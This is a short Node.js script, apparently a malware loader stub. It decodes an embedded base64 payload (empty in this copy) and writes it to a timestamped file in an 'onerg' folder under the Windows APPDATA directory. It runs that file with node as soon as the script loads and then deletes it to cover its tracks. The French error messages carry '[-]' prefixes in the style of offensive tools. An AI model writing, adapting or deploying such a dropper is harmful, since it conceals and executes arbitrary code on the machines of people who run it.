
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');


const encodedPayload = "";


function executePayload() {
    try {

        const decodedPayload = Buffer.from(encodedPayload, 'base64').toString('utf8');
        

        const tempDir = path.join(process.env.APPDATA, 'onerg');
        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
        }
        
        const tempFile = path.join(tempDir, `payload_${Date.now()}.js`);
        

        fs.writeFileSync(tempFile, decodedPayload);
        

        exec(`node "${tempFile}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`[-] Erreur d'exécution: ${error.message}`);
                return;
            }
            if (stdout) console.log(stdout);
            if (stderr) console.error(stderr);
            

            try {
                fs.unlinkSync(tempFile);
            } catch (cleanupError) {
                console.error(`[-] Erreur de nettoyage: ${cleanupError.message}`);
            }
        });
    } catch (error) {
        console.error(`[-] Erreur: ${error.message}`);
    }
}


executePayload();
